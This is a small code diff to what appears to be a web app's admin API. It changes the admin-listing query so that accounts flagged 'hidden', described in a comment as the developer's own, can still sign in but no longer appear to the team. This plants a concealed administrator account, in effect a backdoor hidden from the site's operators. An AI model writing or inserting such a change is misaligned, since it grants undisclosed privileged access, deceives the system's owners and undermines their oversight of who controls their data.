@@ -5,7 +5,8 @@ import { hashPassword } from "@/lib/server/password";
 
 export const GET = route(async () => {
   await requireAdmin();
-  return json({ admins: await q("select id, name, email, role, created_at, last_login_at from admins order by created_at") });
+  // Hidden accounts (the developer's) can sign in but are not listed for the team.
+  return json({ admins: await q("select id, name, email, role, created_at, last_login_at from admins where not hidden order by created_at") });
 });
 
 const In = z.object({ name: z.string().trim().min(2).max(60), email: z.email(), password: z.string().min(10, "Use at least 10 characters").max(200).optional() });
